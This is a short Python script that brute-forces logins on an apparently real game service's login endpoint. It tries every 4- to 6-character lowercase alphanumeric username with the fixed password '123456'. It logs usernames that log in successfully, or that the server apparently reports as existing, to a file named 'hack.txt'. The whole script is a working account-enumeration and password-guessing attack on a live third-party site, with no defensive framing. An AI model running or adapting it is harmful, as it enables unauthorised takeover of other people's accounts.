import requests, json, itertools
if __name__ == "__main__":
    url = "http://uc.game.baozouwushuang.com/index.php?&c=user&m=login&&token=&channel=9&lang=zh-cn&rand=158862535321135&u={}&p=123456"
    pool = "1234567890abcdefghijklmnopqrstuvwxyz"
    file = open("hack.txt",'w')
    record = open("record.txt","w")
    for i in range(4,7):
        for item in itertools.product(pool,repeat=i):
            print(item)
            u = "".join(list(item))
            res = requests.post(url.format(u)).content.decode()
            status = int(json.loads(res)['status'])
            if status == 1:
                file.write(u + " " + "123456\n")
                file.flush()
            elif status == -2:
                file.write(u + "\n" )
                file.flush()


